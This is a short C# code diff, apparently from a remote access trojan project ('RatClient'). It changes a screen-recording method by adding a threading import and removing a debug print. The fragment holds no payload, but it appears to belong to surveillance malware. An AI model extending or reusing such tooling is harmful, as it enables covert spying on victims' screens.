@@ -3,6 +3,7 @@ using System.Drawing.Imaging;
 using System.Runtime.InteropServices;
 using SharpAvi.Codecs;
 using SharpAvi.Output;
+using System.Threading;
 
 
 namespace RatClient.Mtool
@@ -52,7 +53,6 @@ namespace RatClient.Mtool
 
         public void StartRecording(string path)
         {
-            System.Console.WriteLine($"{Width}x{Height}");
             stopRecordingEvent = new ManualResetEvent(false);
             t = new Thread(() => RecordVideo(path));
             t.Start();
